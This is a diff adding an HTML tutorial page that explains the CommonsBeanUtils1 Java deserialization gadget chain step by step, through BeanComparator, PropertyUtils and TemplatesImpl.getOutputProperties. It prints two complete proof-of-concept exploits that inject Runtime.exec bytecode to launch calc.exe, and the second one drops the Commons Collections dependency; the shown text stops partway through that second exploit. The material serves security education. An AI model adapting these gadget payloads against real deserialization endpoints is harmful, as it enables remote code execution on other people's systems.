@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CommonsBeanUtils1 | zdaylabs</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
+      color: #dcdcdc;
+      line-height: 1.6;
+      padding: 0 2rem;
+      min-height: 100vh;
+    }
+    
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 2rem 0 1rem;
+      border-bottom: 1px solid #333;
+    }
+    
+    .logo {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ffffff;
+    }
+    
+    nav a {
+      margin: 0 1rem;
+      text-decoration: none;
+      color: #ccc;
+      font-size: 0.95rem;
+    }
+    
+    nav a:hover {
+      color: #fef200;
+    }
+    
+    .socials a {
+      margin-left: 1rem;
+      color: #999;
+      font-size: 1.2rem;
+      text-decoration: none;
+    }
+    
+    main {
+      max-width: 1000px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+    
+    h1 {
+      font-size: 2.5rem;
+      color: #fff;
+      margin-bottom: 1rem;
+    }
+    
+    h2 {
+      color: #fef200;
+      font-size: 1.8rem;
+      margin: 2rem 0 1rem;
+      border-bottom: 2px solid #333;
+      padding-bottom: 0.5rem;
+    }
+    
+    h3 {
+      color: #fef200;
+      font-size: 1.4rem;
+      margin: 1.5rem 0 0.8rem;
+    }
+    
+    h4 {
+      color: #fef200;
+    }
+    
+    .highlight {
+      color: #fef200;
+      font-weight: 600;
+    }
+    
+    .accent {
+      color: #36d1dc;
+    }
+    
+    p {
+      color: #bbb;
+      margin-bottom: 1rem;
+    }
+    
+    pre {
+      background-color: #1e2329;
+      border: 1px solid #333;
+      border-radius: 4px;
+      padding: 1rem;
+      overflow-x: auto;
+      margin: 1rem 0;
+    }
+    
+    code {
+      color: #36d1dc;
+      font-family: 'Courier New', monospace;
+    }
+    
+    a {
+      color: #36d1dc;
+      text-decoration: none;
+    }
+    
+    a:hover {
+      color: #fef200;
+    }
+    
+    ul, ol {
+      color: #bbb;
+    }
+    
+    li {
+      margin-bottom: 0.5rem;
+    }
+    
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 4px;
+      margin: 1rem 0;
+    }
+  </style>
+</head>
+<body>
+  <div id="navigation-placeholder"></div>
+  <script src="navigation.js"></script>
+
+  <main>
+    <h1>CommonsBeanUtils1</h1>
+    <p>
+      If you are reading this for the first time, I would recommend going through the CommonsCollections blogs first and then coming back to it.
+      This series is built on top of the CommonsCollections series.
+    </p>
+
+    <p>
+      In this blog post we will discuss the CommonsBeanUtils1 gadget &mdash; how it works, why we need exactly 3 dependencies, and we will complete the blog by writing our custom code that will pop a calculator.
+    </p>
+
+    <p>
+      CommonsBeanUtils1 is very similar to CommonsCollections2.
+    </p>
+
+    <p>
+      As a refresher, CommonsCollections2 uses the following gadget chain.
+    </p>
+    <p>
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<code><span style="color: #bcbec4;">PriorityQueue</span>.<span style="color: #56a8f5;">readObject</span><span style="color: #bcbec4;">()</span>
+   <span style="color: #bcbec4;">PriorityQueue</span>.<span style="color: #56a8f5;">heapify</span><span style="color: #bcbec4;">()</span>
+     <span style="color: #bcbec4;">PriorityQueue</span>.<span style="color: #56a8f5;">shiftdownOperator</span><span style="color: #bcbec4;">()</span>
+       <span style="color: #bcbec4;">Comparator</span>.<span style="color: #56a8f5;">compare</span><span style="color: #bcbec4;">()</span>
+          <span style="color: #bcbec4;">TransformingComparator</span>.<span style="color: #56a8f5;">compare</span><span style="color: #bcbec4;">()</span>
+                <span style="color: #bcbec4;">InvokerTransformer</span>.<span style="color: #56a8f5;">transform</span><span style="color: #bcbec4;">()</span>
+                    <span style="color: #bcbec4;">TemplatesImpl</span>.<span style="color: #56a8f5;">newTransform</span><span style="color: #bcbec4;">()</span>
+                        <span style="color: #bcbec4;">Loads our byteCode and executes it which indeed calls</span>
+                            <span style="color: #bcbec4;">Runtime</span>.<span style="color: #56a8f5;">getRuntime</span><span style="color: #bcbec4;">()</span>.<span style="color: #56a8f5;">exec</span><span style="color: #bcbec4;">(cmd)</span></code>
+        </pre>
+      </div>
+    </p>
+
+    <p>
+      We were using TransformingComparator with InvokerTransformer() to call newTransformer() on the TemplatesImpl class in order to achieve code execution.
+    </p>
+
+    <p>
+      In the case of CommonsBeanUtils1, the only change we make is that instead of using TransformingComparator with InvokerTransformer(), we will simply use BeanComparator.
+    </p>
+
+    <p>
+      So at a high level, the gadget chain will look something like this.
+    </p>
+
+    <p>
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<code><span style="color: #bcbec4;">PriorityQueue</span>.<span style="color: #56a8f5;">readObject</span><span style="color: #bcbec4;">()</span>
+   <span style="color: #bcbec4;">PriorityQueue</span>.<span style="color: #56a8f5;">heapify</span><span style="color: #bcbec4;">()</span>
+     <span style="color: #bcbec4;">PriorityQueue</span>.<span style="color: #56a8f5;">shiftdownOperator</span><span style="color: #bcbec4;">()</span>
+       <span style="color: #bcbec4;">BeanComparator</span>.<span style="color: #56a8f5;">compare</span><span style="color: #bcbec4;">()</span>
+        <span style="color: #bcbec4;">SOMETHING SOMETHING</span>
+            <span style="color: #bcbec4;">TemplatesImpl</span>.<span style="color: #56a8f5;">getOutputProperties</span><span style="color: #bcbec4;">()</span>
+                <span style="color: #bcbec4;">TemplatesImpl</span>.<span style="color: #56a8f5;">newTransformer</span><span style="color: #bcbec4;">()</span></code>
+        </pre>
+      </div>
+    </p>
+
+    <p>
+      <p style="margin: 0 0 10px 0;">
+        <strong style="color:#bcbec4;">Note:</strong>
+        Check out CC2 to understand how the compare method of BeanComparator gets called by simply setting this up with the PriorityQueue.
+      </p>
+
+      <h2 style="margin: 12px 0 8px 0; color:#bcbec4;">Understanding BeanComparator.compare()</h2>
+
+      <p style="margin: 0 0 10px 0;">Let's understand what goes on inside BeanComparator.compare().</p>
+
+      <p style="margin: 0 0 10px 0;">When we initialise the BeanComparator as:</p>
+
+      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt; margin: 0 0 12px 0;">
+<code><span style="color:#bcbec4;">BeanComparator</span> <span style="color:#bcbec4;">bc</span><span style="color:#bcbec4;">=</span><span style="color:#cf8e6d;">new</span> <span style="color:#bcbec4;">BeanComparator</span><span style="color:#bcbec4;">(</span><span style="color:#6aab73;">"outputProperties"</span><span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span></code>
+      </pre>
+
+      <p style="margin: 0 0 10px 0;">It calls the below constructor:</p>
+
+      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt; margin: 0 0 12px 0;">
+<code><span style="color:#cf8e6d;">public</span> <span style="color:#bcbec4;">BeanComparator</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">String</span> <span style="color:#bcbec4;">property</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+    <span style="color:#cf8e6d;">this</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">property</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">ComparableComparator</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getInstance</span><span style="color:#bcbec4;">()</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+<span style="color:#bcbec4;">}</span></code>
+      </pre>
+
+      <p style="margin: 0 0 10px 0;">This further sets 2 things:</p>
+
+      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt; margin: 0 0 12px 0;">
+<code><span style="color:#cf8e6d;">public</span> <span style="color:#bcbec4;">BeanComparator</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">String</span> <span style="color:#bcbec4;">property</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">Comparator</span><span style="color:#bcbec4;">&lt;?&gt;</span> <span style="color:#bcbec4;">comparator</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+    <span style="color:#56a8f5;">setProperty</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">property</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#cf8e6d;">if</span> <span style="color:#bcbec4;">(</span><span style="color:#bcbec4;">comparator</span> <span style="color:#bcbec4;">!=</span> <span style="color:#cf8e6d;">null</span><span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#cf8e6d;">this</span><span style="color:#bcbec4;">.</span><span style="color:#bcbec4;">comparator</span> <span style="color:#bcbec4;">=</span> <span style="color:#bcbec4;">comparator</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span> <span style="color:#cf8e6d;">else</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#cf8e6d;">this</span><span style="color:#bcbec4;">.</span><span style="color:#bcbec4;">comparator</span> <span style="color:#bcbec4;">=</span> <span style="color:#bcbec4;">ComparableComparator</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getInstance</span><span style="color:#bcbec4;">()</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span>
+<span style="color:#bcbec4;">}</span></code>
+      </pre>
+
+      <p style="margin: 0 0 10px 0;">
+        So <code>this.property</code> gets set to "outputProperties" and the comparator is set to ComparableComparator from the CommonsCollections library.
+      </p>
+
+      <p style="margin: 0 0 10px 0;">Once this is done, the execution will further move to:</p>
+
+      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt; margin: 0;">
+<code><span style="color:#cf8e6d;">public</span> <span style="color:#cf8e6d;">int</span> <span style="color:#56a8f5;">compare</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">T</span> <span style="color:#bcbec4;">o1</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">T</span> <span style="color:#bcbec4;">o2</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+
+    <span style="color:#cf8e6d;">if</span> <span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">property</span> <span style="color:#bcbec4;">==</span> <span style="color:#cf8e6d;">null</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#bcbec4;">// compare the actual objects</span>
+        <span style="color:#cf8e6d;">return</span> <span style="color:#56a8f5;">internalCompare</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">o1</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">o2</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span>
+
+    <span style="color:#cf8e6d;">try</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#bcbec4;">Object</span> <span style="color:#bcbec4;">value1</span> <span style="color:#bcbec4;">=</span> <span style="color:#bcbec4;">PropertyUtils</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getProperty</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">o1</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">property</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+        <span style="color:#bcbec4;">Object</span> <span style="color:#bcbec4;">value2</span> <span style="color:#bcbec4;">=</span> <span style="color:#bcbec4;">PropertyUtils</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getProperty</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">o2</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">property</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+        <span style="color:#cf8e6d;">return</span> <span style="color:#56a8f5;">internalCompare</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">value1</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">value2</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span>
+    <span style="color:#cf8e6d;">catch</span> <span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">IllegalAccessException</span> <span style="color:#bcbec4;">iae</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#cf8e6d;">throw new</span> <span style="color:#bcbec4;">RuntimeException</span><span style="color:#bcbec4;">(</span> <span style="color:#6aab73;">"IllegalAccessException: "</span> <span style="color:#bcbec4;">+</span> <span style="color:#bcbec4;">iae</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">toString</span><span style="color:#bcbec4;">()</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span>
+    <span style="color:#cf8e6d;">catch</span> <span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">InvocationTargetException</span> <span style="color:#bcbec4;">ite</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#cf8e6d;">throw new</span> <span style="color:#bcbec4;">RuntimeException</span><span style="color:#bcbec4;">(</span> <span style="color:#6aab73;">"InvocationTargetException: "</span> <span style="color:#bcbec4;">+</span> <span style="color:#bcbec4;">ite</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">toString</span><span style="color:#bcbec4;">()</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span>
+    <span style="color:#cf8e6d;">catch</span> <span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">NoSuchMethodException</span> <span style="color:#bcbec4;">nsme</span> <span style="color:#bcbec4;">)</span> <span style="color:#bcbec4;">{</span>
+        <span style="color:#cf8e6d;">throw new</span> <span style="color:#bcbec4;">RuntimeException</span><span style="color:#bcbec4;">(</span> <span style="color:#6aab73;">"NoSuchMethodException: "</span> <span style="color:#bcbec4;">+</span> <span style="color:#bcbec4;">nsme</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">toString</span><span style="color:#bcbec4;">()</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+    <span style="color:#bcbec4;">}</span>
+<span style="color:#bcbec4;">}</span></code>
+      </pre>
+
+    <p>
+      The property is already set, so internalCompare does not get executed in the if block.
+    </p>
+
+    <p>
+      Inside the try block we do:
+    </p>
+
+    <p>
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<code><span style="color:#bcbec4;">PropertyUtils</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getProperty</span><span style="color:#bcbec4;">(</span> <span style="color:#bcbec4;">o1</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">property</span> <span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span></code>
+        </pre>
+      </div>
+    </p>
+
+    <p>
+      Here we control both o1 and property. The value of the property is "outputProperties" and o1 is an object of the TemplatesImpl class.
+    </p>
+
+    <p>
+      This function, defined as below, calls PropertyUtilsBean.getProperty() with TemplatesImpl as the bean name and "outputProperties" as the name:
+    </p>
+
+    <p>
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<code><span style="color:#cf8e6d;">public</span> <span style="color:#cf8e6d;">static</span> <span style="color:#bcbec4;">Object</span> <span style="color:#56a8f5;">getProperty</span><span style="color:#bcbec4;">(</span><span style="color:#bcbec4;">Object</span> <span style="color:#bcbec4;">bean</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">String</span> <span style="color:#bcbec4;">name</span><span style="color:#bcbec4;">)</span>
+        <span style="color:#cf8e6d;">throws</span> <span style="color:#bcbec4;">IllegalAccessException</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">InvocationTargetException</span><span style="color:#bcbec4;">,</span>
+        <span style="color:#bcbec4;">NoSuchMethodException</span> <span style="color:#bcbec4;">{</span>
+
+    <span style="color:#cf8e6d;">return</span> <span style="color:#bcbec4;">(</span><span style="color:#bcbec4;">PropertyUtilsBean</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getInstance</span><span style="color:#bcbec4;">()</span><span style="color:#bcbec4;">.</span><span style="color:#56a8f5;">getProperty</span><span style="color:#bcbec4;">(</span><span style="color:#bcbec4;">bean</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">name</span><span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span>
+
+<span style="color:#bcbec4;">}</span></code>
+        </pre>
+      </div>
+    </p>
+
+    <p>
+      Which further calls getNestedProperty(). Since we do not have any nested property (which would look something like a.b.c instead of outputProperties), getSimpleProperty() gets called.
+    </p>
+
+    <p>
+      Which then calls at line 1254:
+    </p>
+
+    <p>
+      <div style="background-color: #1e1f22; color: #bcbec4;">
+        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<code><span style="color:#bcbec4;">PropertyDescriptor</span> <span style="color:#bcbec4;">descriptor</span> <span style="color:#bcbec4;">=</span>
+        <span style="color:#56a8f5;">getPropertyDescriptor</span><span style="color:#bcbec4;">(</span><span style="color:#bcbec4;">bean</span><span style="color:#bcbec4;">,</span> <span style="color:#bcbec4;">name</span><span style="color:#bcbec4;">)</span><span style="color:#bcbec4;">;</span></code>
+        </pre>
+      </div>
+    </p>
+
+    <p>
+      This further calls getIntrospectionData(), which is a JDK class used to find certain methods based on the name.
+    </p>
+    <img src="images/beyoncommonsCollection/getintrospectiondata.png">
+
+    <p>
+      It finds getter/setter methods that are public and take no arguments.
+    </p>
+
+    <p>
+      If you look into TemplatesImpl.java, you will see there is a function called getOutputProperties which matches all the requirements.
+    </p>
+
+    <p>
+      So it returns getOutputProperties.
+    </p>
+
+    <p>
+      This is passed to invokeMethod(). Once it invokes getOutputProperties(), this is going to invoke newTransformer().
+    </p>
+      <img src="images/beyoncommonsCollection/getoutput.png">
+      <img src="images/beyoncommonsCollection/newTransformer.png">
+    <p>
+      And from CommonsCollections2 we know that if we are able to invoke this method, we can achieve code execution via the same TemplatesImpl.java by loading our bytecode into _bytecodes, which will execute our bytecode.
+    </p>
+
+    <h3>Quick Question:</h3>
+
+    <p>
+      We do not actually send getOutputProperties() to invokeMethod() — we send something called readMethod.
+    </p>
+
+    <p>
+      The propertyDescriptor does not simply return the instance of that function or the function itself.
+    </p>
+
+    <p>
+      It returns a propertyDescriptor object.
+    </p>
+
+    <p>
+      Using this object, Bean.getClass() and reflection getReadMethod() returns the actual method that we need to invoke.
+    </p>
+    <img src="images/beyoncommonsCollection/readMethod.png">
+
+    <h2>Exploit Code</h2>
+
+    <p>
+      So in the end we can use the below code to instantly pop a calculator.
+    </p>
+
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+<span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
+<span style="color: #cf8e6d;">import</span> javassist.ClassPool;
+<span style="color: #cf8e6d;">import</span> javassist.CtClass;
+<span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+<span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+<span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.beanutils.BeanComparator;
+
+<span style="color: #cf8e6d;">public class</span> hello {
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws</span> Exception {
+        <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"calc.exe"</span>;
+        <span style="color: #cf8e6d;">ClassPool</span> pool = <span style="color: #cf8e6d;">ClassPool</span>.<span style="color: #56a8f5;">getDefault</span>();
+
+        <span style="color: #7a7e85;">/*
+         * Explanation: Creating bytecode that extends AbstractTranslet
+         */</span>
+        <span style="color: #cf8e6d;">final CtClass</span> clazz = pool.<span style="color: #56a8f5;">get</span>(hello.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
+            command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\\</span><span style="color: #6aab73;">"</span>, <span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\\\\</span><span style="color: #6aab73;">"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\"</span><span style="color: #6aab73;">"</span>, <span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\\\"</span><span style="color: #6aab73;">"</span>) +
+            <span style="color: #6aab73;">"\");"</span>;
+        clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
+        <span style="color: #cf8e6d;">CtClass</span> superC = pool.<span style="color: #56a8f5;">get</span>(<span style="color: #cf8e6d;">AbstractTranslet</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+        clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
+        <span style="color: #cf8e6d;">final byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
+        <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
+
+        <span style="color: #cf8e6d;">TemplatesImpl</span> templates = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TemplatesImpl</span>();
+
+        <span style="color: #cf8e6d;">Field</span> bytecodesField = <span style="color: #cf8e6d;">TemplatesImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
+        bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #b3ae60;">true</span>);
+        bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new byte</span>[][]{ maliciousBytecode });
+
+        <span style="color: #cf8e6d;">Field</span> nameField = <span style="color: #cf8e6d;">TemplatesImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
+        nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #b3ae60;">true</span>);
+        nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
+
+        <span style="color: #cf8e6d;">Field</span> tfacname = <span style="color: #cf8e6d;">TemplatesImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
+        tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #b3ae60;">true</span>);
+        tfacname.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">TransformerFactoryImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
+
+        <span style="color: #7a7e85;">// So the exploit creation is extremely same as CC2. Simply instead of InvokerTransFormer and TrasformingComparator we will be using BeanComparator</span>
+        <span style="color: #cf8e6d;">BeanComparator</span> bc = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">BeanComparator</span>(<span style="color: #6aab73;">"outputProperties"</span>);
+        <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">TemplatesImpl</span>&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">TemplatesImpl</span>&gt;(<span style="color: #b3ae60;">2</span>, bc);
+        priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+        priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
+    }
+}</pre></div>
+
+<img src="images/beyoncommonsCollection/withcc.png">
+    <h2>Question 1: Where are Commons Logging and Commons Collections being used?</h2>
+
+    <p>
+      Commons Logging is not used in the exploit chain at all.
+      The only reason it is listed as a dependency is that Commons BeanUtils will throw an error if it does not find commons-logging in the classpath, as it is a compile-time dependency of Commons BeanUtils.
+    </p>
+
+    <p>
+      Regarding Commons Collections usage:
+      when we create an instance of BeanComparator with a string as an argument, there exists a constructor that uses the ComparableComparator from the CommonsCollections library.
+    </p>
+
+    <p>
+      However, this comparator is not used in the exploit chain at all, and thus we can bypass this by simply using another comparator that implements Serializable:
+    </p>
+
+<span style="color: #cf8e6d;">BeanComparator</span> bc = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">BeanComparator</span>(<span style="color: #6aab73;">"outputProperties"</span>, <span style="color: #cf8e6d;">Collections</span>.<span style="color: #56a8f5;">reverseOrder</span>());
+
+    <p>
+      Collections.reverseOrder() implements Serializable and can be used, and this is how the updated code will look.
+    </p>
+
+    <p>
+      So by making this code change, can we simply remove the Commons Collections requirement from the classpath?
+    </p>
+
+    <p>
+      <strong>Yes</strong>
+    </p>
+
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
+<span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
+<span style="color: #cf8e6d;">import</span> javassist.ClassPool;
+<span style="color: #cf8e6d;">import</span> javassist.CtClass;
+<span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+<span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span style="color: #cf8e6d;">import</span> java.util.Collections;
+<span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
+<span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.beanutils.BeanComparator;
+
+<span style="color: #cf8e6d;">public class</span> hello {
+    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws</span> Exception {
+        <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"calc.exe"</span>;
+        <span style="color: #cf8e6d;">ClassPool</span> pool = <span style="color: #cf8e6d;">ClassPool</span>.<span style="color: #56a8f5;">getDefault</span>();
+
+        <span style="color: #7a7e85;">/*
+         * Explanation: Creating bytecode that extends AbstractTranslet
+         */</span>
+        <span style="color: #cf8e6d;">final CtClass</span> clazz = pool.<span style="color: #56a8f5;">get</span>(hello.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+        <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
+            command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\\</span><span style="color: #6aab73;">"</span>, <span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\\\\</span><span style="color: #6aab73;">"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\"</span><span style="color: #6aab73;">"</span>, <span style="color: #6aab73;">"</span><span style="color: #cf8e6d;">\\\"</span><span style="color: #6aab73;">"</span>) +
+            <span style="color: #6aab73;">"\");"</span>;
+        clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
+        <span style="color: #cf8e6d;">CtClass</span> superC = pool.<span style="color: #56a8f5;">get</span>(<span style="color: #cf8e6d;">AbstractTranslet</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
+        clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
+        <span style="color: #cf8e6d;">final byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
+        <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
+
+        <span style="color: #cf8e6d;">TemplatesImpl</span> templates = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TemplatesImpl</span>();
+
+        <span style="color: #cf8e6d;">Field</span> bytecodesField = <span style="color: #cf8e6d;">TemplatesImpl</span>.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
+        bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #b3ae60;">true</span>);
+        bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new byte</span>[][]{ maliciousBytecode });
+
